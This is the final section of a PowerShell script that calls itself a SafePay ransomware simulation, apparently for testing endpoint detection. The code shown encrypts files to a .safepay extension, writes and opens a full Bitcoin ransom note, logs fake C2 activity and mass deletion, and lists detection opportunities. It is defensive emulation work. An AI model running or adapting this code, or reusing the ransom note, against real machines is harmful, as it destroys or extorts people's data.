                    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                }
            }
        } catch {
            Write-SimulationLog "Failed to encrypt $($file.Name): $_" "ERROR"
            $encryptionFailures += @{
                FileName = $file.Name
                Error = $_.Exception.Message
            }
        }
    }
    
    Write-SimulationLog "Encryption complete - Files encrypted: $($encryptedFiles.Count), Failed: $($encryptionFailures.Count)" "INFO"
    
    # Log detailed encryption results
    Write-SimulationLog "Successfully encrypted files with .safepay extension:" "SUCCESS"
    $encryptedFiles | ForEach-Object {
        Write-SimulationLog "  - $($_.OriginalName) -> $($_.EncryptedName)" "SUCCESS"
    }
    
    if ($encryptionFailures.Count -gt 0) {
        Write-SimulationLog "Failed to encrypt the following files:" "WARNING"
        $encryptionFailures | ForEach-Object {
            Write-SimulationLog "  - $($_.FileName): $($_.Error)" "WARNING"
        }
    }
} else {
    Write-SimulationLog "No files remaining for encryption (mass deletion completed)" "INFO"
}

Write-PhaseLog "FILE ENCRYPTION" "COMPLETED"

# Create ransom note
Write-PhaseLog "RANSOM NOTE CREATION" "STARTED"
Write-SimulationLog "Creating ransom note" "INFO"
$ransomNote = @"
================================================================================
                           SAFEPAY RANSOMWARE
================================================================================

All your files have been encrypted!

Your files have been encrypted with military-grade encryption and a unique key
generated for this computer. Private decryption key is stored on our secret
server and nobody can decrypt your files without paying for the key.

WHAT HAPPENED?
--------------
Your important files are encrypted. Many of your documents, photos, videos,
databases and other files are no longer accessible because they have been
encrypted. Maybe you are busy looking for a way to recover your files, but
do not waste your time. Nobody can recover your files without our decryption
service.

HOW TO RECOVER FILES?
--------------------
To recover your files, you need to pay 0.5 Bitcoin to the following address:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, send your Computer ID to: safepay@darkweb.onion

Your Computer ID: $(Get-Random -Minimum 100000 -Maximum 999999)

WARNINGS!
---------
- Do not try to decrypt files yourself
- Do not contact data recovery companies
- Do not reinstall Windows
- Your files will be permanently lost if you don't follow instructions

You have 72 hours to make the payment.

================================================================================
"@

$ransomNotePath = Join-Path $targetDir "readme_safepay.txt"
Set-Content -Path $ransomNotePath -Value $ransomNote
Write-SimulationLog "Ransom note created: $ransomNotePath" "SUCCESS"
Write-PhaseLog "RANSOM NOTE CREATION" "COMPLETED"

# Update status after ransom note creation
"RANSOM_NOTE_CREATED" | Out-File "C:\F0\status.txt" -Encoding ASCII

# Open ransom note (simulate ransomware behavior)
try {
    Start-Process notepad.exe -ArgumentList $ransomNotePath -WindowStyle Normal
    Write-SimulationLog "Displayed ransom note to user" "SUCCESS"
} catch {
    Write-SimulationLog "Failed to display ransom note" "WARNING"
}

# Simulate C2 communication header pattern
Write-PhaseLog "C2 COMMUNICATION SIMULATION" "STARTED"
Write-SimulationLog "Simulating C2 communication" "INFO"
Write-SimulationLog "Sending header pattern: C4 C3 C2 C1" "INFO"
Write-SimulationLog "Establishing connection to C2 server" "INFO"
Write-SimulationLog "Encryption key sent to attacker server" "INFO"
Write-PhaseLog "C2 COMMUNICATION SIMULATION" "COMPLETED"

# Display final statistics
Write-PhaseLog "ATTACK SUMMARY" "GENERATING"
Write-SimulationLog "Generating attack summary statistics" "INFO"
$encryptedFilesCount = Get-ChildItem -Path $targetDir -Filter "*.safepay" -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count
$archiveFiles = Get-ChildItem -Path $targetDir -Filter "*.rar" -Recurse -File | Measure-Object | Select-Object -ExpandProperty Count

# Calculate execution time
$executionTime = (Get-Date) - $script:StartTime
$executionMinutes = [Math]::Round($executionTime.TotalMinutes, 2)

Write-SimulationLog "================================================================================" "SUCCESS"
Write-SimulationLog "ATTACK SUMMARY" "SUCCESS"
Write-SimulationLog "================================================================================" "SUCCESS"
Write-SimulationLog "Files Created: $filesCreated" "SUCCESS"
Write-SimulationLog "Files Deleted: $deletedCount" "SUCCESS"
Write-SimulationLog "Files Encrypted (.safepay): $encryptedFilesCount" "SUCCESS"
Write-SimulationLog "Archive Files Created: $archiveFiles" "SUCCESS"
Write-SimulationLog "Target Location: $targetDir" "SUCCESS"

# List all .safepay files for verification
$safepayFiles = Get-ChildItem -Path $targetDir -Filter "*.safepay" -Recurse -File
if ($safepayFiles.Count -gt 0) {
    Write-SimulationLog "Created .safepay extension files:" "SUCCESS"
    $safepayFiles | Select-Object -First 10 | ForEach-Object {
        Write-SimulationLog "  - $($_.FullName) (Size: $([Math]::Round($_.Length/1KB, 2))KB)" "SUCCESS"
    }
    if ($safepayFiles.Count -gt 10) {
        Write-SimulationLog "  ... and $($safepayFiles.Count - 10) more files" "SUCCESS"
    }
}

# Calculate total data processed
$totalSizeKB = ($filesCreated * 7.5)  # Average file size
$totalSizeMB = [Math]::Round($totalSizeKB / 1024, 2)
Write-SimulationLog "Data Processed: ${totalSizeMB}MB" "SUCCESS"
Write-SimulationLog "Execution Time: $executionMinutes minutes" "SUCCESS"

Write-SimulationLog "================================================================================" "SUCCESS"
Write-SimulationLog "SafePay Enhanced Ransomware Simulation completed!" "SUCCESS"
Write-SimulationLog "================================================================================" "SUCCESS"

# Final status update
"COMPLETED:$encryptedFilesCount" | Out-File "C:\F0\status.txt" -Encoding ASCII

Write-SimulationLog "EDR Detection Opportunities:" "INFO"
Write-SimulationLog "  - Mass file creation in user directory" "INFO"
Write-SimulationLog "  - Multiple simultaneous WinRAR processes" "INFO"
Write-SimulationLog "  - Rapid file deletion patterns" "INFO"
Write-SimulationLog "  - File encryption with suspicious extensions (.safepay)" "INFO"
Write-SimulationLog "  - PowerShell execution policy bypass" "INFO"

Write-SimulationLog "Simulation log saved to: $script:LogFile" "SUCCESS"
Write-SimulationLog "Simulation completed at: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" "SUCCESS"

# SIG # Begin signature block
# MIIIvAYJKoZIhvcNAQcCoIIIrTCCCKkCAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDW7CgCgRuuii1K
# b+V8T+jMqa+MUnUJmTPl9QaUrvorDqCCBSYwggUiMIIDCqADAgECAhAf+3Y1zDuG
# iUby8zvhPQbOMA0GCSqGSIb3DQEBDQUAMCIxIDAeBgNVBAMMF0YwLUxvY2FsQ29k
# ZVNpZ25pbmctQ1NUMB4XDTI1MDEyNzAyMzQ0MVoXDTI2MDEyNzAyNDQ0MFowIjEg
# MB4GA1UEAwwXRjAtTG9jYWxDb2RlU2lnbmluZy1DU1QwggIiMA0GCSqGSIb3DQEB
# AQUAA4ICDwAwggIKAoICAQDFJLPQGVV5cPrIfWg8AOz7iHi0V/SYVUHEs3K0G0wu
# vPknaHvGqTr2pKL+YKjve7WcgR5cF7+Tv7hpO02TdKxZsLpjqyYnd6YhYoi6V9JZ
# lz3tppu/XFg2dp7qrXpGjs9McCxAtL0dXjgZHJfsDyM8p6CvwTq9r2hFirmlMOYD
# 8Zsyy6BHuPCSg7fvXIFaKPR6b5Q6C4B4nwC2w9j6QmS8oDNMkIq+qHgFgx0mvNQc
# NtOM3i5sflnlQnQwUg9/myulkt724UubL20cVhSSyzvMaNvqOREZPHU7NZRF4R/7
# uohOpN/+fQHrMNu+XLZONxvtbHAA3R5Y1LnQOl/4AYhXgEjbdiZD7yKZLIC3f6Pb
# I5IYJEvPRv0xE1MErFHcCu7Zq0sNTlzERvGC1JvzikWRhWPGW+c3Y9Gn6kyaDCFK
# RPv40wzHK8M5Dg5u5fJjqm+ebwXjv12Z/FoPqFQ5Oubi/TDoOqLS8pzaPILMPmOM
# SnbqDAawpHslIJrSnNkz9FuWw157ME0RkhKJngnoJ3KBhzFnqYivoG3ZhhXFj/0i
# 4ksTG7G5NKpkI0F7PeetNalRv7llZ70xMMARLM6f/vGTetumqfpqHyXVlguZ/lKy
# 7NGEyXChpFk21rHEcwzDmsu/y1a1NBeyQ6yyWeEfc82zqBbV8HWVLHs8ruRXITGl
# 6QIDAQABo1QwUjAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUHAwMw
# DAYDVR0TAQH/BAIwADAdBgNVHQ4EFgQUemxrbIkL/bJnXptoCkBWU0PlbNQwDQYJ
# KoZIhvcNAQENBQADggIBADJgqO2FosDnM4YQ2TY0oK1aUZFE42dodxTInYouMMNH
# C2+ifAKTCcR7QpWDqvgVBS5nZmR2mfJDXEdR5WTyryXWwBz1ltxKFUYlW3t96x4L
# lAAo0YYzVhSAwlBzuMVrTxAp1wjmwPtclCI8JOcFdqBR+ZJq+V6VQjQGnzHlxVyx
# sk/Zz7iaf4t4uneLg8kh4GxPCuU4Kvuc2J0Zg9qawCT3TuUwMh1VHvtKnJT2oDgn
# nXYntM1MKSg7IGAQC9I90uC6e/tngpTb+Ur6nD3hz3vOaIuRaHR/pau0Z6mVZdQ0
# v5VU0GutEYJz6aZy4231VkU9c+7g7CxMPU4sw3TlPZ9/XXA7FFp/YSxF0C4q+M6s
# 23ZxL4Sa9arbHplb2HNBTvL4SWAARicHZyB0Q1tJxqMEBWLmhQyGci2YnuBgtIpo
# ZS+WmDG6MEmicWTPqJg5/rprIcE/dBBptPGuKkWJbl5lreX7J11C2cgkxZmYGxqO
# JlytDfqS+Q1r8dLr/6PXZfY5T0u2DEr7fUo+p9k3XfLdcZLQp41gamSvGRX73J5L
# 509sfRYgRfSFzKrQ5uqGLG35qxZQQlgeRS90t2gfLw6psBFjYHNmPUZcUSRmTpgu
# j3guCY8qtQxMLSWFGQ4kMyPiutnxb/B6Vp5BL/sScp2mpofPLbpZEmLXsjMLi6bT
# MYIC7DCCAugCAQEwNjAiMSAwHgYDVQQDDBdGMC1Mb2NhbENvZGVTaWduaW5nLUNT
# VAIQH/t2Ncw7holG8vM74T0GzjANBglghkgBZQMEAgEFAKCBiDAZBgkqhkiG9w0B
# CQMxDAYKKwYBBAGCNwIBBDAcBgkqhkiG9w0BCQUxDxcNMjUwODE5MDAyNDU3WjAc
# BgorBgEEAYI3AgELMQ4wDAYKKwYBBAGCNwIBFTAvBgkqhkiG9w0BCQQxIgQgVo9X
# Uon1uavsS2zBPhw3EMypl4HWEssrvHnkstehZXEwDQYJKoZIhvcNAQEBBQAEggIA
# BsnYcfuWrHchZuIh7MbtvlE817p1Ma0Cbm/VdzpPTp9gYuLvq0PbMwCzgQpRm2mt
# y5zNdoI5v+v/ewgydVAmZmeoGModzRfCeZsOSJwUR+B+jwlP+BWkBO6gDQlsLage
# JGfv1oDM+mhL8Exec9KInRo4vz04Lm3wnoH393BAylhzvymTVslxPW3Li3uqv6Ci
# AR1h5tPOfMUcGH269rVhHctRy3dPC1sPnEcXjDWsg2TdoDlWE+XuY17x25BrCnx7
# iukwJRlAyIQjNJlNkvFXCLJ/BhmGZ/MJ7CrBz550hhwzA8OeWYEBmZ2amuUQz3G5
# g4CwgrA25bBmvJ9Ax5jqn0Qlb3b0IfvEQ6ygZLtAgXqMt0mRlKUAOlsFU/BH7oEU
# YGeU0HpAW+iJwjN/koGnUqfLWWQ+LhK9mQrNIelB4miUdSD2qowoFsRhTm/Np+JJ
# seQiJ3fFPqUg4wadoW7czUOcJXxgwi2WSbrxtl/2PGGR5jCFMLGIyrXXZ1TzFbCt
# 1KXcGpJWHC4CUEK+NIJGo6+uLNuoGhIVCh22g92uhSlGsmHqhVVBe1hF+5bpkshv
# QuDQZ7JNPfRVaXd78fanONoD8pI9EOciAFIaRC69qRrCqiBzGPjucYCvG7ZMYY2K
# SpR5GUpJhhL7bSyyjYWCJVFfR5/ojHhseUxtIVsYtFw=
# SIG # End signature block
